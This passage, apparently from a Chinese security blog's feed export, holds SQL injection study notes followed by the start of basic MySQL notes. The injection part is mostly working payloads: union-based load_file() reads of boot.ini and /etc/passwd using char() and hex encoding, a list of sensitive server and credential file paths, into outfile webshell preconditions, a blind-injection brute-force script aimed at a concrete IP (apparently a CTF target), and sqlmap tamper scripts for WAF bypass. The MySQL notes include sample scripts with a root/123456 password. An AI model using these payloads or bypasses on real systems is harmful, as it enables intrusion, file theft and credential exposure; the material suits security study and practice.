load_file(‘/etc/hosts’)</p><p>例如上面的例子是有条件限制的：</p><p>1、必须有权限读取并且文件必须完全可读。</p><p>  and (select count(*) from mysql.user)&gt;0 /<em>如果结果返回正常，说明具有读写权限.</em>/</p><p>  and (select count(<em>) from mysql.user)&gt;0 /</em> 返回错误，应该是管理员给数据库账户降权了*/</p><p>2、欲读取文件必须在服务器上</p><p>3、必须指定文件完整的路径</p><p>4、欲读取文件必须小于max_allowed_packet</p><p>　　如果该文件不存在，或因为上面的任一原因而不能被读出，函数返回空。比较难满足的就是权限。</p><p>在windows下，如果NTFS设置得当，是不能读取相关的文件的，当遇到administrators才能访问的文件，</p><p>users就不能实现用load_file读取文件了。</p><p>在实际的注入中，我们有两个难点需要解决：</p><p>1、绝对物理路径。</p><p>2、构造有效的畸形语句。</p><p> 　在很多PHP程序中，当提交一个错误的查询时，如果display_errors=on，程序就会暴露web目录的绝对路径，只有知道</p><p>路径，那么对于一个可以注入的PHP程序来说，整个服务器的安全将受到严重的威胁。</p><p>利用：</p><p>　　我们假设一个程序的SQL语句如下：</p><p>select * from article where articleid=$id  (当前条件：magic_quotes_gpc = off, c:/boot.ini可读）</p><p>此时，我们构造$id为：</p><p>-1 union select 1,1,1,1,load_file(‘c:/boot.ini’)</p><p>我们的查询语句就变成：</p><p>select * from article where articleid=-1 union select 1,1,1,1,load_file(‘c:/boot.ini’)</p><p>程序就会把c:/boot.ini内容老老实实显示出来，但是现在magic_quotes_gpc=off的主机少之又少，怎么才能构造处没有</p><p>引号的语句呢？</p><p>char()函数或者把字符转换成16进制。</p><p>注：当前条件为<code>magic_quotes_gpc=on, c:/boot.ini</code>可读。</p><p>我们构造$id为：</p><p><code>-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))</code></p><p><code>&quot;char(99,58,47,98,111,111,116,46,105,110,105)&quot;</code>就是“c:/boot.ini”的ASCII代码。</p><p>我们的查询语句就变成：</p><p><code>select * from article where articleid=-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))</code></p><p>这样我们也可以成功读取boot.ini文件，还有把字符转换为16进制的：</p><p>“c:/boot.ini”的十六进制是”0x633a2f626f6f742e696e69”,所以上面的语句就变成：</p><p><code>select * from article where articleid=-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69)</code></p><p>当然，在实际应用中，由于种种条件限制，文件的内容未必会显示出来，我们可以用into outfile把文件导出。</p><hr><p>关于mysql into outfile注射，要使用into outfile 把代码写到web目录取得webshell首先需要3大先天条件：</p><p>1、知道物理路径（into outfule ‘物理路径’), 这样才能写对目录。</p><p>2、能够使用union （需要mysql 3以上的版本）</p><p>3、对方没有对(‘)进行过滤（因为outfile后面的（’’)不可以用其他函数代替转换）</p><p>后天条件需要二个：</p><p>1、就是mysql用户拥有file_priv权限（不然就不能写文件或读文件）</p><p>2、对web目录有写权限MS的系统就不说了，一般都会有权限的，但是*nix的系统，通常都是rwxr-xr-x，也就是</p><p>   说组跟其他用户都没有权限写操作，所以，要满足这5大条件还是蛮高难度的。</p><hr><p>mysql的load_file()常见的用法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">1、replace(load_file(0×2F6574632F706173737764), 0x3c, 0x20)</span><br><span class="line"></span><br><span class="line">2、replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))</span><br><span class="line"></span><br><span class="line">上面两个是查看一些php文件里完全显示代码。有些时候不替换一些字符，如&quot;&lt;&quot;替换成&quot;空格&quot;,返回的是网页。</span><br><span class="line"></span><br><span class="line">而无法查看到代码。</span><br><span class="line"></span><br><span class="line">3、load_file(char(47))可以列出FreeBSD, Sunos系统根目录。</span><br><span class="line"></span><br><span class="line">4、/etc/httpd/conf/httpd.conf或者/usr/local/apache/conf/httpd.conf查看linux apache虚拟主机配置文件。</span><br><span class="line"></span><br><span class="line">5、c:/Program Files/Apache Group/Apache/conf/httpd.conf或c:/apache/conf/httpd.conf 查看windows系统</span><br><span class="line"></span><br><span class="line">　　apache文件。</span><br><span class="line"></span><br><span class="line">6、c:/Resin-3.0.14/conf/resin.conf 或c:/Resin/conf/resin.conf 查看jsp开发网站的resin文件配置信息。</span><br><span class="line"></span><br><span class="line">7、/usr/local/resin/conf/resin.cof  查看linux系统配置的JSP虚拟主机</span><br><span class="line"></span><br><span class="line">8、d:/apache/apache2/conf/httpd.conf</span><br><span class="line"></span><br><span class="line">9、c:/Program Files/mysql.my.ini</span><br><span class="line"></span><br><span class="line">10、../themes/darkblue_orange/layout.inc.php  phpmyadmin 爆路径</span><br><span class="line"></span><br><span class="line">11、c:/windows/system32/inetsrv/MetaBase.xml 查看IIS的虚拟主机配置文件</span><br><span class="line"></span><br><span class="line">12、/usr/local/resin-3.0.22/conf/resin.conf  或/usr/local/resin-pro-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看</span><br><span class="line"></span><br><span class="line">13、/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看</span><br><span class="line"></span><br><span class="line">14、/etc/sysconfig/iptables 查看防火墙策略</span><br><span class="line"></span><br><span class="line">15、usr/local/app/php5/lib/php.ini  PHP 的设置</span><br><span class="line"></span><br><span class="line">16、/etc/my.cnf  MYSQL的配置文件</span><br><span class="line"></span><br><span class="line">17、/etc/redhat-release 红帽子的系统版本</span><br><span class="line"></span><br><span class="line">18、c:/mysql/data/mysql/user.MYD 存在MYSQL系统中的用户密码</span><br><span class="line"></span><br><span class="line">19、/etc/sysconfig/network-scripts/ifcfg-eth0 查看IP.</span><br><span class="line"></span><br><span class="line">20、/usr/local/app/apache2/conf/extra/httpd-vhosts.conf  虚拟网站设置</span><br><span class="line"></span><br><span class="line">21、c:/windows/my.ini</span><br></pre></td></tr></table></figure><h1 id="loacte"><a href="#loacte" class="headerlink" title="loacte()"></a>loacte()</h1><p><code>Locate()</code><br><code>LOCATE(substr,str) , LOCATE(substr,str,pos) </code><br>第一个语法返回字符串 str中子字符串substr的第一个出现位置。第二个语法返回字符串 str中子字符串substr的第一个出现位置, 起始位置在pos。如若substr 不在str中，则返回值为0。</p><p>这里主要利用第二个语法进行报错注入：</p><p>假设数据库名为security</p><p>首先从最基本的：</p><p><code>locate(‘s’,(select database()),1)</code></p><p>表示查询数据库名，并且是从第一位开始，返回字符s第一次出现的位置。</p><p>但是仅凭这一句是无法获取特别有用的信息的，但是可以在构造</p><p><code>locate(‘s’,(select database()),1)=1</code></p><p>查询数据库名的第一位开始，如果存在s,并且s的位置等于1，那么等式成立。</p><p>综合利用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username from security.users where id=1 and (locate(‘s’,(select database()),1)=1)</span><br></pre></td></tr></table></figure><p>如果返回值正常，我们就可以认为第一位是s,同理构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username from security.users where id=1 and (locate(‘X’,(select database()),n)=n)</span><br></pre></td></tr></table></figure><p>将x遍历，n从1开始增加，即可。</p><p>不过还有个问题：mysql对字段名的大小写是不敏感的，也就是说会同时出现S和s 满足，都会被记录。</p><p>这里可以用binary修饰，表示二进制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username from security.users where id=1 and (locate(binary’X’,(select database()),n)=n)</span><br></pre></td></tr></table></figure><p>附上脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">rs = requests.session()</span><br><span class="line">url0=&quot;http://120.24.86.145:9004/Once_More.php&quot;</span><br><span class="line">def locate():</span><br><span class="line">    flag = &#x27;&#x27;</span><br><span class="line">    for j in range(1, 100):</span><br><span class="line">        char_all = &#x27;!@$%^&amp;*()_+=-|&#125;&#123;POIU YTREWQASDFGHJKL:?&gt;&lt;MNBVCXZqwertyuiop[];lkjhgfdsazxcvbnm,./1234567890`~&#x27;</span><br><span class="line">        key = 0</span><br><span class="line">        for i in char_all:</span><br><span class="line">            url = url0+&quot;?id=1&#x27;and  (select locate(binary&#x27;&quot; + str(</span><br><span class="line">                i) + &quot;&#x27;,(select database() limit 0,1),&quot; + str(</span><br><span class="line">                j) + &quot;))=&quot; + str(j) + &quot;%23&quot;</span><br><span class="line">            r1 = rs.get(url)</span><br><span class="line">            print (url)</span><br><span class="line">            if &quot;Hello&quot; in r1.text:</span><br><span class="line">                print(str(i) + &quot; -----&quot; + str(j))</span><br><span class="line">                flag += str(i)</span><br><span class="line">                print(&quot;[*] : &quot; + flag)</span><br><span class="line">                key = 1</span><br><span class="line">        if key == 0:</span><br><span class="line">            break</span><br><span class="line">locate()</span><br></pre></td></tr></table></figure><h1 id="Sqlmap-Tamper-编写"><a href="#Sqlmap-Tamper-编写" class="headerlink" title="Sqlmap Tamper 编写"></a>Sqlmap Tamper 编写</h1><p>从零开始写tamper</p><p>简单介绍tamper</p><p>sqlmap的<code>--tamper</code>参数可以引入用户自定义的脚本来修改注入时的payload，由此可以使用tamper来绕过waf，替换被过滤的关键字等。这是一个基本的tamper结构</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;doc/COPYING&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line">__priority__ = PRIORITY.LOW <span class="comment"># 当前脚本调用优先等级</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span> <span class="comment"># 声明当前脚本适用/不适用的范围，可以为空。</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span> <span class="comment"># 用于篡改Payload、以及请求头的主要函数</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><p>需要把他保存为 <code>my.py</code> 放入 <code>sqlmap\tamper</code> 路径下，然后使用的时候加上参数 <code>--tamper=my</code> 就行了</p><p>简单分析</p><p>拿官方的一个tamper来分析下结构</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randomIP</span>():</span></span><br><span class="line">    numbers = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> numbers <span class="keyword">or</span> numbers[<span class="number">0</span>] <span class="keyword">in</span> (<span class="number">10</span>, <span class="number">172</span>, <span class="number">192</span>):</span><br><span class="line">        numbers = random.sample(xrange(<span class="number">1</span>, <span class="number">255</span>), <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span>.join(<span class="built_in">str</span>(_) <span class="keyword">for</span> _ <span class="keyword">in</span> numbers)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Append a fake HTTP header &#x27;X-Forwarded-For&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    headers = kwargs.get(<span class="string">&quot;headers&quot;</span>, &#123;&#125;)</span><br><span class="line">    headers[<span class="string">&quot;X-Forwarded-For&quot;</span>] = randomIP()</span><br><span class="line">    headers[<span class="string">&quot;X-Client-Ip&quot;</span>] = randomIP()</span><br><span class="line">    headers[<span class="string">&quot;X-Real-Ip&quot;</span>] = randomIP()</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><p>分为了import部分、<code>__priority__</code> 属性、dependencies函数、tamper函数以及用户自定义的函数</p><p>import</p><p>这一部分我们可以导入sqlmap的内部库，sqlmap为我们提供了很多封装好的函数和数据类型，比如下文的<code>PRIORITY</code>就来源于<code>sqlmap/lib/core/enums.py</code></p><p>PRIORITY</p><p>PRIORITY是定义tamper的优先级，PRIORITY有以下几个参数:</p><ul><li>LOWEST = -100</li><li>LOWER = -50</li><li>LOW = -10</li><li>NORMAL = 0</li><li>HIGH = 10</li><li>HIGHER = 50</li><li>HIGHEST = 100</li></ul><p>如果使用者使用了多个tamper，sqlmap就会根据每个tamper定义PRIORITY的参数等级来优先使用等级较高的tamper，如果你有两个tamper需要同时用，需要注意这个问题。</p><p>dependencies</p><p>dependencies主要是提示用户，这个tamper支持哪些数据库，具体代码如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> DBMS</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    singleTimeWarnMessage(<span class="string">&quot;这是我的tamper提示&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><p><img src="20191118212606.png" alt="20191118212606"></p><p>DBMS.MYSQL这个参数代表的是Mysql，其他数据库的参数也可以看这个<code>\sqlmap\lib\core\enums.py</code> <img src="20191118212624.png" alt="20191118212624"></p><p>Tamper</p><p>tamper这个函数是tamper最重要的函数，你要实现的功能，全部写在这个函数里。payload这个参数就是sqlmap的原始注入payload，我们要实现绕过，一般就是针对这个payload的修改。kwargs是针对http头部的修改，如果你bypass，是通过修改http头，就需要用到这个</p><p>基于payload</p><p>先来基于修改payload来绕过替换关键字，我使用sqlilab的第一关，并且修改了部分代码来把恶意关键字替换为空来避免联合查询，如图 <img src="20191118212641.png" alt="20191118212641"></p><p>编写tamper来双写绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">    payload = payload.lower()</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;select&#x27;</span>,<span class="string">&#x27;seleselectct&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;ununionion&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><p>没有使用tamper之前，我们加上<code>--tech=U</code>来让sqlmap只测试联合查询注入，<code>--flush-session</code>意思是每次刷新会话，清理上次的缓存。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://php.local/Less-1/?id=1 --tech=U --flush-session --proxy=http://127.0.0.1:8080 --random-agent --dbms=mysql</span><br></pre></td></tr></table></figure><p><img src="20191118212702.png" alt="20191118212702"></p><p>从burp的流量中看到payload是没有双写的，必然会注入失败。而使用了tamper之后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://php.local/Less-1/?id=1 --tech=U --flush-session --proxy=http://127.0.0.1:8080 --random-agent --tamper=my --dbms=mysql</span><br></pre></td></tr></table></figure><p><img src="20191118212747.png" alt="20191118212747"></p><p>payload正常双写，可以注入 <img src="20191118212800.png" alt="20191118212800"></p><p>基于http头</p><p>我们使用<code>sqlmap\tamper\xforwardedfor.py</code>的tamper来讲解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Append a fake HTTP header &#x27;X-Forwarded-For&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    headers = kwargs.get(<span class="string">&quot;headers&quot;</span>, &#123;&#125;)</span><br><span class="line">    headers[<span class="string">&quot;X-Forwarded-For&quot;</span>] = randomIP()</span><br><span class="line">    headers[<span class="string">&quot;X-Client-Ip&quot;</span>] = randomIP()</span><br><span class="line">    headers[<span class="string">&quot;X-Real-Ip&quot;</span>] = randomIP()</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><p>从<code>kwargs</code>中取出<code>headers</code>数组，然后修改了xff值达到随机IP的效果，不再赘述</p><p>参考</p>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql学习记录</title>
      <link href="/2021/12/27/mysql%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
      <url>/2021/12/27/mysql%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="mysql学习"><a href="#mysql学习" class="headerlink" title="mysql学习"></a>mysql学习</h1><p>基本操作</p><p>自由咒语 <code>rm -f</code></p><p>退出 <code>exit</code></p><h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><h4 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h4><p>命令行连接  <code>mysql -uroot -p</code></p><p>脚本连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;Could not connect: &#x27; . mysqli_error());</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;数据库连接成功！&#x27;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="image-20211227125703585.png" alt="image-20211227125703585"></p><h4 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE 数据库名;</span><br></pre></td></tr></table></figure><p>使用mysqladmin</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@host]# mysqladmin -u root -p create RUNOOB</span><br><span class="line">Enter password:******</span><br></pre></td></tr></table></figure><p>使用脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">  die(&#x27;连接错误: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;连接成功&lt;br /&gt;&#x27;;</span><br><span class="line">$sql = &#x27;CREATE DATABASE RUNOOB&#x27;;</span><br><span class="line">$retval = mysqli_query($conn,$sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;创建数据库失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;数据库 RUNOOB 创建成功\n&quot;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="image-20211227125808680.png" alt="image-20211227125808680"></p><h5 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h5><p><code>drop database &lt;数据库名&gt;;</code></p><p>使用mysqladmin</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@host]# mysqladmin -u root -p drop RUNOOB</span><br><span class="line">Enter password:******</span><br><span class="line">Dropping the database is potentially a very bad thing to do.</span><br><span class="line">Any data stored in the database will be destroyed.</span><br><span class="line"></span><br><span class="line">Do you really want to drop the &#x27;RUNOOB&#x27; database [y/N] y</span><br><span class="line">Database &quot;RUNOOB&quot; dropped</span><br></pre></td></tr></table></figure><p>使用脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;连接成功&lt;br /&gt;&#x27;;</span><br><span class="line">$sql = &#x27;DROP DATABASE RUNOOB&#x27;;</span><br><span class="line">$retval = mysqli_query( $conn, $sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;删除数据库失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;数据库 RUNOOB 删除成功\n&quot;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="image-20211227130105043.png" alt="image-20211227130105043"></p><h5 id="选择数据库"><a href="#选择数据库" class="headerlink" title="选择数据库"></a>选择数据库</h5><p><code>use xxx;</code></p><p>使用脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;连接成功&#x27;;</span><br><span class="line">mysqli_select_db($conn, &#x27;RUNOOB&#x27; );</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>数据类型</p><h4 id="MySQL-数据类型"><a href="#MySQL-数据类型" class="headerlink" title="MySQL 